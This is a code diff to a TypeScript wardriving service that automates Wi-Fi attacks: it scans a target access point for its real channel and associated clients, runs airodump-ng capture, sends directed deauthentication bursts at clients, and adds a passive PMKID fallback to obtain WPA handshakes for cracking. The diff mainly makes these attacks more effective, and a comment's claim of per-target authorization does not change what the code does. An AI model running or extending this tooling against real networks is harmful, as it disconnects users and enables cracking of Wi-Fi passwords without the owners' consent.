@@ -6,7 +6,7 @@ import path from "path";
 import { detectMonitorAdapter } from "../wifiradar/adapter";
 import { enterMonitorMode, exitMonitorMode } from "./monitor";
 import { setChannel } from "./rf";
-import { AirodumpCapture, DeauthRunner } from "./attack";
+import { AirodumpCapture, DeauthRunner, scanTarget } from "./attack";
 import { WardriveSession, SESSIONS_ROOT } from "./session";
 import { discoverTargets } from "./discovery";
 import {
@@ -25,9 +25,10 @@ import { unloadModel } from "../cloud-api/local/ollama-llm";
 // only; no code path mass-authorizes "all discovered networks".
 const PMKID_TIMEOUT_MS = 45_000;
 const PMKID_POLL_MS = 3_000;
-const DEAUTH_SETTLE_MS = 8_000; // client reassociation window after the burst
+const DEAUTH_SETTLE_MS = 18_000; // client reassociation window after the burst
 const DEAUTH_BURST = 5; // directed, short bursts — never the 100+ style
 const DEAUTH_MAX_ATTEMPTS = 3;
+const PMKID_PASSIVE_MS = 25_000; // extra passive window after deauth fails
 const BETWEEN_TARGETS_MS = 1_500;
 
 function sanitizeBssid(raw: string): string {
@@ -499,12 +500,6 @@ export class WardriveService extends EventEmitter {
       return;
     }
     this.updateMeta(bssid, { ssid, channel, status: "running", method: "deauth", error: "" });
-    try {
-      await setChannel(this.iface, channel);
-    } catch (err: any) {
-      this.updateMeta(bssid, { status: "failed", error: `setChannel: ${err?.message || err}` });
-      return;
-    }
 
     const prefix = path.join(this.session.dir, bssid.replace(/:/g, "").toLowerCase());
     // Clear stale airodump outputs so a previous run's handshake isn't
@@ -517,10 +512,40 @@ export class WardriveService extends EventEmitter {
       }
     }
 
-    const capturer = new AirodumpCapture(this.iface, bssid, channel, prefix);
+    // Resolve the target's REAL channel (and seed clients) from the air — the
+    // radar's channel can be a hopping-capture artifact and locking the wrong
+    // channel captures nothing.
+    let realChannel = channel;
+    let seedClients: string[] = [];
+    try {
+      const scan = await scanTarget(this.iface, bssid, `${prefix}-scan`, 9);
+      if (scan.channel && scan.channel > 0) {
+        if (scan.channel !== channel) {
+          this.appendLog(bssid, `[capture] canal real ${scan.channel} (el radar reportaba ${channel})`);
+        }
+        realChannel = scan.channel;
+      }
+      seedClients = scan.clients;
+      this.updateMeta(bssid, { channel: realChannel });
+    } catch {
+      /* keep the radar channel */
+    }
+    if (this.attackAbort) {
+      this.updateMeta(bssid, { status: "cancelled" });
+      return;
+    }
+
+    try {
+      await setChannel(this.iface, realChannel);
+    } catch (err: any) {
+      this.updateMeta(bssid, { status: "failed", error: `setChannel: ${err?.message || err}` });
+      return;
+    }
+
+    const capturer = new AirodumpCapture(this.iface, bssid, realChannel, prefix);
     this.captureRunner = capturer;
     capturer.on("log", (line: string) => this.appendLog(bssid, `[airodump] ${line}`));
-    this.appendLog(bssid, `[capture] airodump-ng on ${this.iface} ch${channel} targeting ${bssid}`);
+    this.appendLog(bssid, `[capture] airodump-ng on ${this.iface} ch${realChannel} targeting ${bssid}`);
     capturer.start();
     const capFile = capturer.capPath();
 
@@ -534,7 +559,7 @@ export class WardriveService extends EventEmitter {
         // Prefer directed deauth at real associated clients (far more
         // effective than broadcast); fall back to the radar snapshot, then
         // to a broadcast burst.
-        let clients = capturer.associatedClients();
+        let clients = [...new Set([...capturer.associatedClients(), ...seedClients])];
         if (clients.length === 0) {
           const c = this.pickClientFor(bssid);
           if (c) clients = [c];
@@ -559,9 +584,21 @@ export class WardriveService extends EventEmitter {
       this.markCaptured(bssid, "deauth", capFile);
       return;
     }
+
+    // PMKID fallback: if deauth didn't produce a handshake, keep the locked
+    // capture running and wait for a passive PMKID frame (WPA3/SAE networks
+    // don't do 4-way handshakes but still emit PMKID on client connect).
+    this.appendLog(bssid, `[pmkid] passive fallback window ${PMKID_PASSIVE_MS / 1000}s`);
+    this.updateMeta(bssid, { method: "pmkid" });
+    captured = await this.waitForCapture(bssid, capFile, PMKID_PASSIVE_MS);
+    if (captured) {
+      this.markCaptured(bssid, "pmkid", capFile);
+      return;
+    }
+
     this.updateMeta(bssid, {
       status: "failed",
-      error: "sin handshake — el objetivo puede ser WPA3/SAE o sin clientes WPA2",
+      error: "sin handshake ni PMKID — el objetivo puede ser WPA3/SAE puro o sin clientes",
     });
   }
 
